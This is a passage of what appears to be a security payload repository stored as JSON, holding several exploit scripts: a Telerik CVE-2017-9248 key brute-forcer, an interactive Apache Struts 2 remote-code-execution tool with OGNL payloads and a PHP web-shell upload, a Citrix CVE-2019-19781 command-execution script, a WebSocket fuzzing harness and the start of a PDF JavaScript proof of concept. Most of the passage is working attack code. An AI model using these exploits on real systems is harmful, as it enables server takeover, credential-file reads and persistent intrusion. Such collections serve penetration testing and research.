encrypted)\n\n\ndef mode_decrypt():\n    ciphertext = base64.b64decode(args.ciphertext).decode()\n    key = args.key\n    print(base64.b64decode(encrypt(ciphertext, key)).decode())\n    print(\"\")\n\n\ndef mode_encrypt():\n    plaintext = args.plaintext\n    key = args.key\n\n    plaintext = base64.b64encode(plaintext.encode()).decode()\n    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())\n    print(\"\")\n\n\ndef test_keypos(key_charset, unprintable, found, session):\n    pad_chars = ''\n    for pad_char in range(256):\n        pad_chars += chr(pad_char)\n\n    for i in range(len(pad_chars)):\n        for k in range(len(key_charset)):\n            keychar = key_charset[k]\n            sys.stdout.write(\"\\b\"*6)\n            sys.stdout.write(\n                        (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \") [\" + (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \"]\"\n                    )\n            sys.stdout.flush()\n            if test_keychar(keychar, found, session, pad_chars[i] * 3):\n                return keychar\n    return False\n\n\ndef get_key(session):\n    global char_requests\n    found = ''\n    unprintable = False\n\n    key_length = args.key_len\n    key_charset = args.charset\n    if key_charset == 'all':\n        unprintable = True\n        key_charset = ''\n        for i in range(256):\n            key_charset += chr(i)\n    else:\n        if key_charset == 'hex':\n            key_charset = '01234567890ABCDEF'\n\n    print(\"Attacking \" + args.url)\n    print(\n        \"to find key of length [\" +\n        str(key_length) +\n        \"] with accuracy threshold [\" +\n        str(args.accuracy) +\n        \"]\"\n    )\n    print(\n        \"using key charset [\" +\n        (\n            key_charset\n            if unprintable is False\n            else '- all ASCII -'\n        ) +\n        \"]\\n\"\n    )\n    for i in range(int(key_length)):\n        pos_str = (\n            str(i + 1)\n            if i > 8\n            else \"0\" + str(i + 1)\n        )\n        sys.stdout.write(\"Key position \" + pos_str + \": (------\")\n        sys.stdout.flush()\n        keychar = test_keypos(key_charset, unprintable, found, session)\n        if keychar is not False:\n            found = found + keychar\n            sys.stdout.write(\n                          \"\\b\"*7 + \"{\" +\n                          (\n                              keychar\n                              if unprintable is False\n                              else '0x' + binascii.hexlify(keychar.encode()).decode()\n                          ) +\n                          \"} found with \" +\n                          str(char_requests) +\n                          \" requests, total so far: \" +\n                          str(requests_sent) +\n                          \"\\n\"\n                      )\n            sys.stdout.flush()\n            char_requests = 0\n        else:\n            sys.stdout.write(\"\\b\"*7 + \"Not found, quitting\\n\")\n            sys.stdout.flush()\n            break\n    if keychar is not False:\n        print(\"Found key: \" +\n              (\n                found\n                if unprintable is False\n                else \"(hex) \" + binascii.hexlify(found.encode()).decode()\n              )\n              )\n    print(\"Total web requests: \" + str(requests_sent))\n    return found\n\n\ndef mode_brutekey():\n    session = requests.Session()\n    found = get_key(session)\n\n    if found == '':\n        return\n    else:\n        urls = {}\n        url_path = args.url\n        params = (\n                    '?DialogName=DocumentManager' +\n                    '&renderMode=2' +\n                    '&Skin=Default' +\n                    '&Title=Document%20Manager' +\n                    '&dpptn=' +\n                    '&isRtl=false' +\n                    '&dp='\n                  )\n        versions = [\n                    '2007.1423', '2007.1521', '2007.1626', '2007.2918',\n                    '2007.21010', '2007.21107', '2007.31218', '2007.31314',\n                    '2007.31425', '2008.1415', '2008.1515', '2008.1619',\n                    '2008.2723', '2008.2826', '2008.21001', '2008.31105',\n                    '2008.31125', '2008.31314', '2009.1311', '2009.1402',\n                    '2009.1527', '2009.2701', '2009.2826', '2009.31103',\n                    '2009.31208', '2009.31314', '2010.1309', '2010.1415',\n                    '2010.1519', '2010.2713', '2010.2826', '2010.2929',\n                    '2010.31109', '2010.31215', '2010.31317', '2011.1315',\n                    '2011.1413', '2011.1519', '2011.2712', '2011.2915',\n                    '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411',\n                    '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',\n                    '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',\n                    '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',\n                    '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',\n                    '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204',\n                    '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623',\n                    '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111',\n                    '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607',\n                    '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',\n                    '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',\n                    '2017.3.913'\n                    ]\n\n        plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'\n        plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='\n        plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'\n        plaintext3 = ';AllowMultipleSelection,False,3,False'\n\n        if len(args.version) > 0:\n            versions = [args.version]\n\n        for version in versions:\n            plaintext2_raw2 = version\n            plaintext2 = base64.b64encode(\n                            (plaintext2_raw1 +\n                                plaintext2_raw2 +\n                                plaintext2_raw3\n                             ).encode()\n                        ).decode()\n            plaintext = plaintext1 + plaintext2 + plaintext3\n            plaintext = base64.b64encode(\n                            plaintext.encode()\n                        ).decode()\n            ciphertext = base64.b64encode(\n                            encrypt(\n                                plaintext,\n                                found\n                            ).encode()\n                        ).decode()\n            full_url = url_path + params + ciphertext\n            urls[version] = full_url\n\n        found_valid_version = False\n        for version in urls:\n            url = urls[version]\n            request = requests.Request('GET', url)\n            request = request.prepare()\n            response = session.send(request, verify=False, proxies=getProxy(args.proxy))\n            if response.status_code == 500:\n                continue\n            else:\n                match = re.search(\n                    \"(Error Message:)(.+\\n*.+)(</div>)\",\n                    response.text\n                    )\n                if match is None:\n                    print(version + \": \" + url)\n                    found_valid_version = True\n                    break\n\n        if not found_valid_version:\n            print(\"No valid version found\")\n\ndef mode_samples():\n    print(\"Samples for testing decryption and encryption functions:\")\n    print(\"-d ciphertext key\")\n    print(\"-e plaintext key\")\n    print(\"\")\n    print(\"Key:\")\n    print(\"DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D\")\n    print(\"\")\n    print(\"Plaintext:\")\n    print(\"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False\")\n    print(\"\")\n    print(\"Ciphertext:\")\n    print(\"FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+\")\n    print(\"\")\n\n\ndef mode_b64e():\n    print(base64.b64encode(args.parameter.encode()).decode())\n    print(\"\")\n\n\ndef mode_b64d():\n    print(base64.b64decode(args.parameter.encode()).decode())\n    print(\"\")\n\nsys.stderr.write(\n              \"\\ndp_crypto by Paul Taylor / @bao7uo\\nCVE-2017-9248 - \" +\n              \"Telerik.Web.UI.dll Cryptographic compromise\\n\\n\"\n            )\n\np = argparse.ArgumentParser()\nsubparsers = p.add_subparsers()\n\ndecrypt_parser = subparsers.add_parser('d', help='Decrypt a ciphertext')\ndecrypt_parser.set_defaults(func=mode_decrypt)\ndecrypt_parser.add_argument('ciphertext', action='store', type=str, default='', help='Ciphertext to decrypt')\ndecrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')\n\nencrypt_parser = subparsers.add_parser('e', help='Encrypt a plaintext')\nencrypt_parser.set_defaults(func=mode_encrypt)\nencrypt_parser.add_argument('plaintext', action='store', type=str, default='', help='Ciphertext to decrypt')\nencrypt_parser.add_argument('key', action='store', type=str, default='', help='Key to decrypt')\n\nbrute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')\nbrute_parser.set_defaults(func=mode_brutekey)\nbrute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL')\nbrute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')\nbrute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')\nbrute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')\nbrute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined. OPTIONAL: default is hex')\nbrute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \\\n    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')\nbrute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')\n\nencode_parser = subparsers.add_parser('b', help='Encode parameter to base64')\nencode_parser.set_defaults(func=mode_b64e)\nencode_parser.add_argument('parameter', action='store', type=str, help='Parameter to encode')\n\ndecode_parser = subparsers.add_parser('p', help='Decode base64 parameter')\ndecode_parser.set_defaults(func=mode_b64d)\ndecode_parser.add_argument('parameter', action='store', type=str, help='Parameter to decode')\n\nargs = p.parse_args()\n\nif len(sys.argv) > 2:\n    args.func()\n", "CVE Exploits/Apache Struts 2 CVE-2013-2251 CVE-2017-5638 CVE-2018-11776_.py": "#!/usr/bin/python\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import input\nfrom builtins import str\nimport urllib.request, urllib.error, urllib.parse\nimport time\nimport sys\nimport os\nimport subprocess\nimport requests\nimport readline\nimport urllib.parse\n\nRED = '\\033[1;31m'\nBLUE = '\\033[94m'\nBOLD = '\\033[1m'\nGREEN = '\\033[32m'\nOTRO = '\\033[36m'\nYELLOW = '\\033[33m'\nENDC = '\\033[0m'\n\ndef cls():\n    os.system(['clear', 'cls'][os.name == 'nt'])\ncls()\n\nlogo = BLUE+'''\n  ___   _____  ___    _   _  _____  ___\n (  _`\\(_   _)|  _`\\ ( ) ( )(_   _)(  _`\\\n | (_(_) | |  | (_) )| | | |  | |  | (_(_)\n `\\__ \\  | |  | ,  / | | | |  | |  `\\__ \\\n ( )_) | | |  | |\\ \\ | (_) |  | |  ( )_) |\n `\\____) (_)  (_) (_)(_____)  (_)  `\\____)\n\n        =[ Command Execution v3]=\n              By @s1kr10s\n'''+ENDC\nprint(logo)\n\nprint(\" * Ejemplo: http(s)://www.victima.com/files.login\\n\")\nhost = input(BOLD+\" [+] HOST: \"+ENDC)\n\nif len(host) > 0:\n    if host.find(\"https://\") != -1 or host.find(\"http://\") != -1:\n\n        poc = \"?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}\"\n\n        def exploit(comando):\n            exploit = \"?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{\"+comando+\"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}\"\n            return exploit\n\n        def exploit2(comando):\n            exploit2 = \"Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='\"+str(comando)+\"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}\"\n            return exploit2\n\n        def exploit3(comando):\n            exploit3 = \"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27\"+comando+\"%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D\"\n            return exploit3\n\n        def pwnd(shellfile):\n            exploitfile = \"?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{\"+shellfile+\"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}\"\n            return exploitfile\n\n        def validador():\n            arr_lin_win = [\"file%20/etc/passwd\",\"dir\",\"net%20users\",\"id\",\"/sbin/ifconfig\",\"cat%20/etc/passwd\"]\n            return arr_lin_win\n\n        #def reversepl(ip,port):\n        #       print \"perl\"\n\n        #def reversepy(ip,port):\n        #       print \"python\"\n\n        # CVE-2013-2251 ---------------------------------------------------------------------------------\n        try:\n            response = ''\n            response = urllib.request.urlopen(host+poc)\n        except:\n            print(RED+\" Servidor no responde\\n\"+ENDC)\n            exit(0)\n\n        print(BOLD+\"\\n [+] EJECUTANDO EXPLOIT CVE-2013-2251\"+ENDC)\n\n        if response.read().find(\"mamalo\") != -1:\n            print(RED+\"   [-] VULNERABLE\"+ENDC)\n            owned = open('vulnsite.txt', 'a')\n            owned.write(str(host)+'\\n')\n            owned.close()\n\n            opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n            #print BOLD+\"   * [SHELL REVERSA]\"+ENDC\n            #print OTRO+\"     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\\n\"+ENDC\n            if opcion == 's':\n                print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                time.sleep(1)\n                print(BOLD+\"   * [UPLOAD SHELL]\"+ENDC)\n                print(OTRO+\"     Struts@Shell:$ pwnd (php)\\n\"+ENDC)\n\n                while 1:\n                    separador = input(GREEN+\"Struts2@Shell_1:$ \"+ENDC)\n                    espacio = separador.split(' ')\n                    comando = \"','\".join(espacio)\n\n                    if espacio[0] != 'reverse' and espacio[0] != 'pwnd':\n                        shell = urllib.request.urlopen(host+exploit(\"'\"+str(comando)+\"'\"))\n                        print(\"\\n\"+shell.read())\n                    elif espacio[0] == 'pwnd':\n                        pathsave=input(\"path EJ:/tmp/: \")\n\n                        if espacio[1] == 'php':\n                            shellfile = \"\"\"'python','-c','f%3dopen(\"/tmp/status.php\",\"w\");f.write(\"<?php%20system($_GET[ksujenenuhw])?>\")'\"\"\"\n                            urllib.request.urlopen(host+pwnd(str(shellfile)))\n                            shell = urllib.request.urlopen(host+exploit(\"'ls','-l','\"+pathsave+\"status.php'\"))\n                            if shell.read().find(pathsave+\"status.php\") != -1:\n                                print(BOLD+GREEN+\"\\nCreate File Successfull :) [\"+pathsave+\"status.php]\\n\"+ENDC)\n                            else:\n                                print(BOLD+RED+\"\\nNo Create File :/\\n\"+ENDC)\n\n        # CVE-2017-5638 ---------------------------------------------------------------------------------\n        print(BLUE+\"     [-] NO VULNERABLE\"+ENDC)\n        print(BOLD+\" [+] EJECUTANDO EXPLOIT CVE-2017-5638\"+ENDC)\n        x = 0\n        while x < len(validador()):\n            valida = validador()[x]\n\n            try:\n                req = urllib.request.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})\n                result = urllib.request.urlopen(req).read()\n\n                if result.find(\"ASCII\") != -1 or result.find(\"No such\") != -1 or result.find(\"Directory of\") != -1 or result.find(\"Volume Serial\") != -1 or result.find(\"inet\") != -1 or result.find(\"root:\") != -1 or result.find(\"uid=\") != -1 or result.find(\"accounts\") != -1 or result.find(\"Cuentas\") != -1:\n                    print(RED+\"   [-] VULNERABLE\"+ENDC)\n                    owned = open('vulnsite.txt', 'a')\n                    owned.write(str(host)+'\\n')\n                    owned.close()\n\n                    opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n                    if opcion == 's':\n                        print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                        time.sleep(1)\n\n                        while 1:\n                            try:\n                                separador = input(GREEN+\"\\nStruts2@Shell_2:$ \"+ENDC)\n                                req = urllib.request.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})\n                                result = urllib.request.urlopen(req).read()\n                                print(\"\\n\"+result)\n                            except:\n                                exit(0)\n                    else:\n                        x = len(validador())\n                else:\n                    print(BLUE+\"     [-] NO VULNERABLE \"+ENDC + \"Payload: \" + str(x))\n            except:\n                pass\n            x=x+1\n\n        # CVE-2018-11776 ---------------------------------------------------------------------------------\n        print(BLUE+\"     [-] NO VULNERABLE\"+ENDC)\n        print(BOLD+\" [+] EJECUTANDO EXPLOIT CVE-2018-11776\"+ENDC)\n        x = 0\n        while x < len(validador()):\n            #Filtramos la url solo dominio\n            url = host.replace('#', '%23')\n            url = host.replace(' ', '%20')\n            if ('://' not in url):\n                url = str(\"http://\") + str(url)\n            scheme = urllib.parse.urlparse(url).scheme\n            site = scheme + '://' + urllib.parse.urlparse(url).netloc\n\n            #Filtramos la url solo path\n            file_path = urllib.parse.urlparse(url).path\n            if (file_path == ''):\n                file_path = '/'\n\n            valida = validador()[x]\n            try:\n                result = requests.get(site+\"/\"+exploit3(str(valida))+file_path).text\n\n                if result.find(\"ASCII\") != -1 or result.find(\"No such\") != -1 or result.find(\"Directory of\") != -1 or result.find(\"Volume Serial\") != -1 or result.find(\"inet\") != -1 or result.find(\"root:\") != -1 or result.find(\"uid=\") != -1 or result.find(\"accounts\") != -1 or result.find(\"Cuentas\") != -1:\n                    print(RED+\"   [-] VULNERABLE\"+ENDC)\n                    owned = open('vulnsite.txt', 'a')\n                    owned.write(str(host)+'\\n')\n                    owned.close()\n\n                    opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n                    if opcion == 's':\n                        print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                        time.sleep(1)\n                        print(BOLD+\"   * [UPLOAD SHELL]\"+ENDC)\n                        print(OTRO+\"     Struts@Shell:$ pwnd (php)\\n\"+ENDC)\n\n                        while 1:\n                            separador = input(GREEN+\"Struts2@Shell_3:$ \"+ENDC)\n                            espacio = separador.split(' ')\n                            comando = \"%20\".join(espacio)\n\n                            shell = urllib.request.urlopen(host+exploit3(str(comando)))\n                            print(\"\\n\"+shell.read())\n\n                    else:\n                        x = len(validador())\n                        exit(0)\n                else:\n                    print(BLUE+\"     [-] NO VULNERABLE \"+ENDC + \"Payload: \" + str(x))\n            except:\n                pass\n            x=x+1\n    else:\n        print(RED+\" Debe introducir el protocolo (https o http) para el dominio\\n\"+ENDC)\n        exit(0)\nelse:\n    print(RED+\" Debe Ingresar una Url\\n\"+ENDC)\n    exit(0)\n", "CVE Exploits/Citrix CVE-2019-19781.py": "#!/usr/bin/env python\n# https://github.com/mpgn/CVE-2019-19781\n# # #\n\nimport requests\nimport string\nimport random\nimport re\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nprint(\"CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway\")\nprint(\"Found by Mikhail Klyuchnikov\")\nprint(\"\")\n\nif len(sys.argv) < 2:\n  print(\"[-] No URL provided\")\n  sys.exit(0)\n\nwhile True:\n    try:\n      command = input(\"command > \")\n\n      random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))\n      print(\"[+] Adding bookmark\", random_xml + \".xml\")\n\n      burp0_url = sys.argv[1] + \"/vpn/../vpns/portal/scripts/newbm.pl\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                      random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      burp0_data = {\"url\": \"http://exemple.com\", \"title\": \"[%t=template.new({'BLOCK'='print `\" + str(command) + \"`'})%][ % t % ]\", \"desc\": \"test\", \"UI_inuse\": \"RfWeb\"}\n      r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)\n\n      if r.status_code == 200:\n        print(\"[+] Bookmark added\")\n      else:\n        print(\"\\n[-] Target not vulnerable or something went wrong\")\n        sys.exit(0)\n\n      burp0_url = sys.argv[1] + \"/vpns/portal/\" + random_xml + \".xml\"\n      burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" +\n                       random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"}\n      r = requests.get(burp0_url, headers=burp0_headers,verify=False)\n\n      replaced = re.sub('^&#.*&#10;$', '', r.text, flags=re.MULTILINE)\n      print(\"[+] Result of the command: \\n\")\n      print(replaced)\n\n    except KeyboardInterrupt:\n            print(\"Exiting...\")\n            break", "Web Sockets/Files/ws-harness.py": "#!/usr/bin/python\nfrom __future__ import print_function\nimport socket,ssl\nfrom BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer\nfrom websocket import create_connection, WebSocket\nfrom urlparse import parse_qs\nimport argparse\nimport os\n\nLOOP_BACK_PORT_NUMBER = 8000\n\ndef FuzzWebSocket(fuzz_value):\n    print(fuzz_value)\n    ws.send(ws_message.replace(\"[FUZZ]\", str(fuzz_value[0])))\n    result =  ws.recv()\n    return result\n\ndef LoadMessage(file):\n    file_contents = \"\"\n    try:\n        if os.path.isfile(file):\n            f = open(file,'r')\n            file_contents = f.read()\n            f.close()\n    except:\n        print(\"Error reading file: %s\" % file)\n        exit()\n    return file_contents\n\nclass myWebServer(BaseHTTPRequestHandler):\n    \n    #Handler for the GET requests\n    def do_GET(self):\n        qs = parse_qs(self.path[2:])\n        fuzz_value = qs['fuzz']\n        result = FuzzWebSocket(fuzz_value)\n        self.send_response(200)\n        self.send_header('Content-type','text/html')\n        self.end_headers()\n        self.wfile.write(result)\n        return\n\nparser = argparse.ArgumentParser(description='Web Socket Harness: Use traditional tools to assess web sockets')\nparser.add_argument('-u','--url', help='The remote WebSocket URL to target.',required=True)\nparser.add_argument('-m','--message', help='A file that contains the WebSocket message template to send. Please place [FUZZ] where injection is desired.',required=True)\nargs = parser.parse_args()\n\nws_message = LoadMessage(args.message)\n\nws = create_connection(args.url,sslopt={\"cert_reqs\": ssl.CERT_NONE},header={},http_proxy_host=\"\", http_proxy_port=8080)\n\ntry:\n    #Create a web server and define the handler to manage the\n    #incoming request\n    server = HTTPServer(('', LOOP_BACK_PORT_NUMBER), myWebServer)\n    print('Started httpserver on port ' , LOOP_BACK_PORT_NUMBER)\n    \n    #Wait forever for incoming http requests\n    server.serve_forever()\n\nexcept KeyboardInterrupt:\n    print('^C received, shutting down the web server')\n    server.socket.close()\n    ws.close()\n", "Upload Insecure Files/Extension PDF JS/poc.py": "# FROM https://github.com/osnr/horrifying-pdf-experiments\nimport sys\n\nfrom pdfrw import PdfWriter\nfrom pdfrw.objects.pdfname import PdfName\nfrom pdfrw.objects.pdfstring import PdfString\nfrom pdfrw.objects.pdfdict import PdfDict\nfrom pdfrw.objects.pdfarray import PdfArray\n\ndef make_js_action(js):\n    action = PdfDict()\n    action.S = PdfName.JavaScript\n    action.JS = js\n    return action\n\ndef make_field(name, x, y, width, height, r, g, b, value=\"\"):\n    annot = PdfDict()\n    annot.Type = PdfName.Annot\n    annot.Subtype = PdfName.Widget\n    annot.FT = PdfName.Tx\n    annot.Ff = 2\n    annot.Rect = PdfArray([x, y, x + width, y + height])\n    annot.MaxLen = 160\n    annot.T = PdfString.encode(name)\n    annot.V = PdfString.encode(value)\n\n    # Default appearance stream: can be arbitrary PDF XObject or\n    # something. Very general.\n    annot.AP = PdfDict()\n\n    ap = annot.AP.N = PdfDict()\n    ap.Type = PdfName.XObject\n    ap.Subtype = PdfName.Form\n    ap.FormType = 1\n    ap.BBox = PdfArray([0, 0, width, height])\n    ap.Matrix = PdfArray([1.0, 0.0, 0.0, 1.0, 0.0, 0.0])\n    ap.stream = \"\"\"\n%f %f %f rg\n0.0 0.0 %f %f re f\n\"\"\" % (r, g, b, width, height)\n\n    # It took me a while to figure this out. See PDF spec:\n    # https://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf#page=641\n\n    # Basically, the appearance stream we just specified doesn't\n    # follow the field rect if it gets changed in JS (at least not in\n    # Chrome).\n\n    # But this simple MK field here, with border/color\n    # characteristics, _does_ follow those movements and resizes, so\n    # we can get moving colored rectangles this way.\n    annot.MK = PdfDict()\n    annot.MK.BG = PdfArray([r, g, b])\n\n    return annot\n\ndef make_page(fields, script):\n    page = PdfDict()\n    page.Type = PdfName.Page\n\n    page.Resources = PdfDict()\n    page.Resources.Font = PdfDict()\n    page.Resources.Font.F1 = PdfDict()\n    page.Resources.Font.F1.Type = PdfName.Font\n    page.Resources.Font.F1.Subtype = PdfName.Type1\n    